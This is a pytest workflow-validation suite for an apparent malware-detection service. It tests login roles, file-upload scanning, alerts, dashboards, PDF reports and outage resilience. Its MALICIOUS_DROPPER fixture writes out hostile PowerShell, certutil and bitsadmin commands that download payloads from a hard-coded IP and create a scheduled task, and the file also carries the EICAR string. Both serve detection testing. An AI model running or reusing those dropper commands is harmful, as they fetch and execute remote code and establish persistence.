"""Milestone 4 (Weeks 7-8) — Application testing & workflow validation.

Owner role: "Perform application testing and workflow validation."

This module is the executable test plan for that role. It validates the
complete ThreatLens AI user journeys end-to-end through the HTTP API
(plus targeted service-level resilience checks), in dependency order:

    WF1  Health, auth & RBAC matrix
    WF2  File upload -> full detection pipeline (benign / malicious / invalid)
    WF3  Pipeline result integrity (verdict / hashes / behavior / intel schema)
    WF4  Threat monitoring dashboard (detections, snapshot, stats, timeline, filters)
    WF5  Alert lifecycle (generation, dedupe, ack/resolve, incidents, notifications)
    WF6  Reports & analytics (PDFs, history, summary, retrieval by ID)
    WF7  Resilience & edge cases (offline intel, ML down, behavioral failure,
         empty file, unauthenticated, oversized guard)

Design notes for reviewers:
- Uses unique filenames per test (uuid) so alert-dedupe (one live alert per
  sample SHA) and in-memory singleton stores stay order-independent.
- Count assertions use deltas (>= before+1), never exact globals.
- Requires the full backend dependency set (notably ``yara-python`` and
  ``lightgbm``). Without YARA the static engine gracefully degrades from
  ``high`` to ``medium`` and high-severity-gated tests fail — see TEST PLAN.
"""

from __future__ import annotations

import io
import time
import uuid

import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.modules.alerts.service import AlertsService
from app.modules.file_analysis.schemas import MLPrediction
from app.modules.file_analysis.service import file_analysis_service
from app.modules.pipeline.fusion import fuse

client = TestClient(app)

# ---------------------------------------------------------------------------
# Fixtures / helpers
# ---------------------------------------------------------------------------

BENIGN_TEXT = b"hello world, this is a normal quarterly report about cats and sales figures. " * 4

MALICIOUS_DROPPER = (
    b"powershell -nop -w hidden -enc AAAA; "
    b"IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/a.ps1'); "
    b"cmd.exe /c certutil -urlcache -f http://45.147.230.112/b b & "
    b"bitsadmin /transfer j http://45.147.230.112/c c & schtasks /create /tn p /tr b"
)

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


def _headers(email: str = "analyst@local") -> dict[str, str]:
    tok = client.post("/api/v1/auth/login", json={"email": email, "password": "x"}).json()[
        "access_token"
    ]
    return {"Authorization": f"Bearer {tok}"}


def _upload(data: bytes, filename: str, email: str = "analyst@local"):
    return client.post(
        "/api/v1/files/upload",
        files={"file": (filename, io.BytesIO(data), "application/octet-stream")},
        headers=_headers(email),
    )


def _uniq(prefix: str) -> str:
    return f"{prefix}-{uuid.uuid4().hex[:8]}.bin"


def _malicious_unique() -> bytes:
    """Malicious dropper bytes with a unique nonce so each scan has a fresh SHA.

    The alert service dedupes by SHA (one live alert per sample), so tests that
    assert 'a new alert was created' must not reuse identical bytes.
    """
    return MALICIOUS_DROPPER + b"#" + uuid.uuid4().hex.encode()


# ---------------------------------------------------------------------------
# WF1 — Health, auth & RBAC
# ---------------------------------------------------------------------------


def test_wf1_health_endpoint_reports_ok():
    assert client.get("/health").json() == {"status": "ok"}


@pytest.mark.parametrize(
    "email",
    ["analyst@local", "soc@local", "admin@local", "researcher@local"],
)
def test_wf1_dev_login_issues_token_for_every_role(email):
    resp = client.post("/api/v1/auth/login", json={"email": email, "password": "anything"})
    assert resp.status_code == 200
    assert resp.json()["access_token"]


def test_wf1_protected_endpoint_rejects_anonymous():
    assert client.get("/api/v1/threats/detections").status_code == 401
    assert client.get("/api/v1/alerts/").status_code == 401
    assert client.get("/api/v1/reports/history").status_code == 401


def test_wf1_rbac_matrix_upload_scan_roles():
    # _SCAN_ROLES = Security Analyst, Administrator, Researcher.
    # SOC Team Member must be forbidden from submitting scans.
    assert _upload(b"probe", _uniq("rbac"), email="analyst@local").status_code == 201
    assert _upload(b"probe", _uniq("rbac"), email="admin@local").status_code == 201
    assert _upload(b"probe", _uniq("rbac"), email="researcher@local").status_code == 201
    assert _upload(b"probe", _uniq("rbac"), email="soc@local").status_code == 403


def test_wf1_users_me_echoes_identity():
    resp = client.get("/api/v1/users/me", headers=_headers("analyst@local"))
    assert resp.status_code == 200
    assert "analyst@local" in resp.json()["id"]


# ---------------------------------------------------------------------------
# WF2 — Upload -> full pipeline
# ---------------------------------------------------------------------------


def test_wf2_benign_file_completes_pipeline_with_low_verdict():
    resp = _upload(BENIGN_TEXT, _uniq("benign"))
    assert resp.status_code == 201
    body = resp.json()
    assert body["verdict"]["label"] == "benign"
    assert body["verdict"]["level"] == "low"
    assert body["hashes"]["sha256"]
    assert body["behavior"] is not None  # behavioral stage always runs


def test_wf2_malicious_dropper_completes_pipeline_with_high_verdict():
    resp = _upload(MALICIOUS_DROPPER, _uniq("dropper"))
    assert resp.status_code == 201
    body = resp.json()
    assert body["verdict"]["label"] == "malicious"
    assert body["verdict"]["level"] == "high"
    assert body["verdict"]["score"] >= 70
    assert body["behavior"] is not None
    assert body["ml"] is not None
    # VirusTotal is not keyed in test env — enrichment must report unconfigured,
    # never fail the scan.
    assert body["threat_intel"]["configured"] is False


def test_wf2_eicar_standard_test_file_is_detected():
    resp = _upload(EICAR, _uniq("eicar"))
    assert resp.status_code == 201
    body = resp.json()
    assert body["verdict"]["label"] in ("malicious", "suspicious")
    assert body["hashes"]["sha256"]


def test_wf2_empty_file_rejected_with_400():
    resp = client.post(
        "/api/v1/files/upload",
        files={"file": ("empty.txt", io.BytesIO(b""), "text/plain")},
        headers=_headers(),
    )
    assert resp.status_code == 400


def test_wf2_scan_stored_file_endpoint_reruns_pipeline():
    first = _upload(MALICIOUS_DROPPER, _uniq("rescan"))
    object_path = first.json()["object_path"]
    resp = client.post(
        "/api/v1/analysis/scan",
        json={"object_path": object_path},
        headers=_headers(),
    )
    assert resp.status_code == 200
    assert resp.json()["verdict"]["label"] in ("malicious", "suspicious")


def test_wf2_pipeline_latency_within_budget():
    started = time.perf_counter()
    resp = _upload(MALICIOUS_DROPPER, _uniq("perf"))
    elapsed = time.perf_counter() - started
    assert resp.status_code == 201
    assert elapsed < 30.0, f"pipeline took {elapsed:.1f}s, budget is 30s"


# ---------------------------------------------------------------------------
# WF3 — Pipeline result integrity
# ---------------------------------------------------------------------------


def test_wf3_verdict_schema_is_internally_consistent():
    body = _upload(MALICIOUS_DROPPER, _uniq("schema")).json()
    verdict = body["verdict"]
    assert 0 <= verdict["score"] <= 100
    assert verdict["level"] in ("low", "medium", "high")
    assert verdict["label"] in ("benign", "suspicious", "malicious")
    # level/label must agree: high<->malicious, medium<->suspicious, low<->benign
    assert {"high": "malicious", "medium": "suspicious", "low": "benign"}[
        verdict["level"]
    ] == verdict["label"]
    assert verdict["agreement"] in ("agree", "ml-only", "rules-only", "conflict")
    assert isinstance(verdict["novel_threat"], bool)
    assert verdict["recommended_action"]
    for key in (
        "static_risk_score",
        "yara_rule_count",
        "ml_available",
        "ml_applicable",
    ):
        assert key in verdict["sources"]


def test_wf3_hashes_metadata_and_network_signals_present():
    body = _upload(MALICIOUS_DROPPER, _uniq("signals")).json()
    assert len(body["hashes"]["sha256"]) == 64
    assert len(body["hashes"]["md5"]) == 32
    assert body["metadata"]["size_bytes"] > 0
    assert body["network_indicators"]["urls"]  # dropper embeds URLs
    assert body["suspicious_indicators"]


def test_wf3_behavioral_block_maps_mitre_attack():
    body = _upload(MALICIOUS_DROPPER, _uniq("mitre")).json()
    # AnalysisResult.behavior is the lightweight capability profile;
    # AnalysisResult.behavioral_analysis is the full MITRE ATT&CK inference.
    assert body["behavior"] is not None
    full = body.get("behavioral_analysis")
    assert full is not None
    assert full["behaviors"]
    assert full["tactics_summary"]
    assert full["attack_chain"]
    assert 0.0 <= full["confidence"] <= 1.0


def test_wf3_fusion_prefers_rules_when_ml_unavailable():
    result = file_analysis_service.analyze_static_file(_uniq("fusion"), MALICIOUS_DROPPER)
    verdict = fuse(result, MLPrediction(available=False))
    assert verdict.level == "high"
    assert verdict.agreement == "rules-only"


# ---------------------------------------------------------------------------
# WF4 — Threat monitoring dashboard
# ---------------------------------------------------------------------------


def test_wf4_scan_populates_detection_history():
    before = len(
        client.get("/api/v1/threats/detections", headers=_headers("soc@local")).json()
    )
    _upload(MALICIOUS_DROPPER, _uniq("monitor"))
    after = client.get("/api/v1/threats/detections", headers=_headers("soc@local"))
    assert after.status_code == 200
    assert len(after.json()) == before + 1
    latest = after.json()[0]
    assert latest["sha256"]
    assert latest["verdict_label"] in ("malicious", "suspicious", "benign")


def test_wf4_snapshot_stats_and_timeline_are_consistent():
    headers = _headers("soc@local")
    snapshot = client.get("/api/v1/threats/snapshot", headers=headers).json()
    stats = client.get("/api/v1/threats/stats", headers=headers).json()
    assert snapshot["total_detections"] == stats["total_detections"]
    assert snapshot["malicious"] == stats["malicious"]
    assert snapshot["total_detections"] >= snapshot["malicious"]

    timeline = client.get("/api/v1/threats/timeline", headers=headers).json()
    assert len(timeline) == 24  # default 24h window -> 24 hourly buckets
    assert sum(b["total"] for b in timeline) <= snapshot["total_detections"]

    for window, expected in (("7d", 7), ("30d", 30)):
        buckets = client.get(
            "/api/v1/threats/timeline", params={"window": window}, headers=headers
        ).json()
        assert len(buckets) == expected


def test_wf4_detection_filters_work():
    headers = _headers("soc@local")
    _upload(MALICIOUS_DROPPER, _uniq("filter"))
    assert client.get("/api/v1/threats/detections", params={"level": "high"}, headers=headers).status_code == 200
    assert client.get("/api/v1/threats/detections", params={"verdict": "malicious"}, headers=headers).status_code == 200
    # free-text search must not error, even with no match
    resp = client.get("/api/v1/threats/detections", params={"q": "no-such-sample-xyz"}, headers=headers)
    assert resp.status_code == 200
    assert resp.json() == []
    # invalid filter values are rejected by query validation
    assert client.get("/api/v1/threats/detections", params={"level": "bogus"}, headers=headers).status_code == 422


def test_wf4_monitoring_report_pdf_downloads():
    resp = client.get("/api/v1/threats/report", headers=_headers("soc@local"))
    assert resp.status_code == 200
    assert resp.headers["content-type"] == "application/pdf"
    assert resp.content[:4] == b"%PDF"


# ---------------------------------------------------------------------------
# WF5 — Alert lifecycle + notifications
# ---------------------------------------------------------------------------


def test_wf5_malicious_scan_raises_alert_benign_does_not():
    soc = _headers("soc@local")
    alerts_before = {a["id"] for a in client.get("/api/v1/alerts/", headers=soc).json()}

    _upload(_malicious_unique(), _uniq("alert"))
    alerts_after = client.get("/api/v1/alerts/", headers=soc).json()
    assert len(alerts_after) == len(alerts_before) + 1
    assert alerts_after[0]["status"] == "open"
    assert alerts_after[0]["severity"] in ("critical", "high")

    count_before = len(alerts_after)
    _upload(BENIGN_TEXT, _uniq("noalert"))
    count_after = len(client.get("/api/v1/alerts/", headers=soc).json())
    assert count_after == count_before  # benign verdicts never page anyone


def test_wf5_alert_dedupe_ack_resolve_and_incident():
    soc = _headers("soc@local")
    analyst = _headers("analyst@local")

    # one live alert per sample SHA: re-scanning the same bytes reuses the alert
    first = _upload(MALICIOUS_DROPPER, _uniq("dedupe")).json()
    sha = first["hashes"]["sha256"]
    open_ids_before = {a["id"] for a in client.get("/api/v1/alerts/", params={"status": "open"}, headers=soc).json()}

    # upload the SAME bytes under a different name -> same SHA -> no new alert
    dupe = _upload(MALICIOUS_DROPPER, _uniq("dedupe")).json()
    assert dupe["hashes"]["sha256"] == sha
    open_ids_after = {a["id"] for a in client.get("/api/v1/alerts/", params={"status": "open"}, headers=soc).json()}
    assert open_ids_after == open_ids_before | (set() if open_ids_before else open_ids_after)
    # at most one new alert was created for this SHA
    assert len(open_ids_after - open_ids_before) <= 1

    target_id = next(iter(open_ids_after - open_ids_before), next(iter(open_ids_after)))
    ack = client.post(f"/api/v1/alerts/{target_id}/acknowledge", json={"note": "triaging"}, headers=analyst)
    assert ack.status_code == 200
    assert ack.json()["status"] == "acknowledged"

    resolved = client.post(f"/api/v1/alerts/{target_id}/resolve", json={"note": "false positive review done"}, headers=analyst)
    assert resolved.status_code == 200
    assert resolved.json()["status"] == "resolved"

    # incident workflow needs an open alert: create a fresh malicious sample
    _upload(_malicious_unique(), _uniq("incident"))
    fresh_open = client.get("/api/v1/alerts/", params={"status": "open"}, headers=soc).json()
    assert fresh_open, "expected a fresh open alert for incident creation"
    inc = client.post(
        "/api/v1/alerts/incidents",
        json={"alert_ids": [fresh_open[0]["id"]], "title": "WF5 validation incident"},
        headers=analyst,
    )
    assert inc.status_code == 201
    assert fresh_open[0]["id"] in inc.json()["alert_ids"]

    stats = client.get("/api/v1/alerts/stats", headers=soc).json()
    assert stats["open"] + stats["acknowledged"] + stats["resolved"] >= 1


def test_wf5_notifications_feed_tracks_alerts():
    soc = _headers("soc@local")
    before = client.get("/api/v1/notifications/unread-count", headers=soc).json()["total"]
    _upload(_malicious_unique(), _uniq("notif"))
    after = client.get("/api/v1/notifications/unread-count", headers=soc).json()["total"]
    assert after >= before + 1

    listing = client.get("/api/v1/notifications/", headers=soc).json()
    assert listing
    marked = client.post(f"/api/v1/notifications/{listing[0]['id']}/read", headers=soc)
    assert marked.status_code == 200
    assert marked.json()["read"] is True


def test_wf5_alert_unit_dedupe_without_http():
    svc = AlertsService()
    result = file_analysis_service.analyze_static_file(_uniq("unit"), MALICIOUS_DROPPER)
    result.verdict = fuse(result, MLPrediction(available=False))
    first = svc.evaluate(result)
    assert first is not None and first.status == "open"
    assert svc.evaluate(result) is first  # same SHA -> same live alert


# ---------------------------------------------------------------------------
# WF6 — Reports & analytics
# ---------------------------------------------------------------------------


def test_wf6_investigation_pdf_and_history():
    headers = _headers()
    analysis = _upload(MALICIOUS_DROPPER, _uniq("pdf")).json()
    before = len(client.get("/api/v1/reports/history", headers=headers).json())

    pdf = client.post("/api/v1/reports/pdf", json=analysis, headers=headers)
    assert pdf.status_code == 200
    assert pdf.headers["content-type"] == "application/pdf"
    assert pdf.content[:4] == b"%PDF"

    after = client.get("/api/v1/reports/history", headers=headers).json()
    assert len(after) == before + 1
    assert after[0]["report_type"] == "investigation"
    assert after[0]["sha256"] == analysis["hashes"]["sha256"]


def test_wf6_summary_report_and_window_validation():
    headers = _headers("soc@local")
    before = len(client.get("/api/v1/reports/history", headers=headers).json())
    pdf = client.post("/api/v1/reports/summary", params={"window": "7d"}, headers=headers)
    assert pdf.status_code == 200
    assert pdf.content[:4] == b"%PDF"
    after = client.get("/api/v1/reports/history", headers=headers).json()
    assert len(after) == before + 1
    assert after[0]["report_type"] == "summary"
    assert client.post("/api/v1/reports/summary", params={"window": "bogus"}, headers=headers).status_code == 422


def test_wf6_threat_prediction_reports_retrievable_by_id():
    sample = _malicious_unique()
    analysis = _upload(sample, _uniq("persist")).json()
    listing = client.get("/api/v1/reports/", headers=_headers()).json()
    # ReportResponse carries the sample hash as file_hash (not sha256).
    match = next((r for r in listing if r.get("file_hash") == analysis["hashes"]["sha256"]), None)
    assert match is not None, "every scan must persist a threat-prediction report"

    single = client.get(f"/api/v1/reports/{match['report_id']}", headers=_headers()).json()
    assert single["file_hash"] == analysis["hashes"]["sha256"]

    repdf = client.get(f"/api/v1/reports/{match['report_id']}/pdf", headers=_headers())
    assert repdf.status_code == 200
    assert repdf.content[:4] == b"%PDF"


def test_wf6_analytics_summary_and_timeline():
    headers = _headers("researcher@local")  # researcher can read analytics
    summary = client.get("/api/v1/analytics/summary", headers=headers)
    assert summary.status_code == 200
    body = summary.json()
    assert body["total_samples"] >= 1
    assert "detection_rate" in body

    timeline = client.get("/api/v1/analytics/timeline", params={"window": "7d"}, headers=headers)
    assert timeline.status_code == 200
    assert len(timeline.json()) == 7


def test_wf6_behavior_endpoints():
    headers = _headers()
    catalog = client.get("/api/v1/behavior/catalog", headers=headers).json()
    assert catalog["total"] >= 20
    tactics = client.get("/api/v1/behavior/tactics", headers=headers).json()
    assert tactics["tactics"]

    upload = client.post(
        "/api/v1/behavior/analyze",
        files={"file": (_uniq("beh"), io.BytesIO(MALICIOUS_DROPPER), "application/octet-stream")},
        headers=headers,
    )
    assert upload.status_code == 200
    assert upload.json()["behaviors"]


# ---------------------------------------------------------------------------
# WF7 — Resilience & edge cases
# ---------------------------------------------------------------------------


def test_wf7_threat_intel_outage_never_breaks_scan(monkeypatch):
    from app.modules.threat_intel import service as intel_module

    def _boom(_sha256):
        raise RuntimeError("VirusTotal is down")

    monkeypatch.setattr(intel_module.threat_intel_service, "lookup_hash", _boom)
    resp = _upload(MALICIOUS_DROPPER, _uniq("intel-down"))
    assert resp.status_code == 201
    assert resp.json()["verdict"] is not None


def test_wf7_behavioral_failure_never_breaks_scan(monkeypatch):
    from app.modules.behavioral_analysis import service as beh_module

    def _boom(*args, **kwargs):
        raise RuntimeError("behavior engine crashed")

    monkeypatch.setattr(beh_module.behavioral_analysis_service, "analyze", _boom)
    resp = _upload(MALICIOUS_DROPPER, _uniq("beh-down"))
    assert resp.status_code == 201
    assert resp.json()["verdict"] is not None


def test_wf7_ml_unavailable_never_breaks_scan(monkeypatch):
    import app.modules.pipeline.service as pipeline_module

    def _boom(_data, _analysis):
        raise RuntimeError("GPU node offline")

    monkeypatch.setattr(pipeline_module, "ml_predict", _boom)
    resp = _upload(MALICIOUS_DROPPER, _uniq("ml-down"))
    assert resp.status_code == 201
    body = resp.json()
    assert body["ml"]["available"] is False
    assert body["verdict"] is not None


def test_wf7_unknown_hash_without_api_key_degrades_gracefully():
    resp = _upload(BENIGN_TEXT, _uniq("intel-clean"))
    assert resp.status_code == 201
    intel = resp.json()["threat_intel"]
    assert intel["configured"] is False
    assert intel["available"] is False
    assert intel["reason"]  # e.g. "VirusTotal API key not configured"


def test_wf7_oversized_upload_guard_exists():
    # The route enforces a 32 MiB cap; assert the constant is wired (sending a
    # real 33 MiB body in CI would be wasteful).
    from app.modules.file_analysis import router as files_router

    assert files_router._MAX_UPLOAD_BYTES == 32 * 1024 * 1024
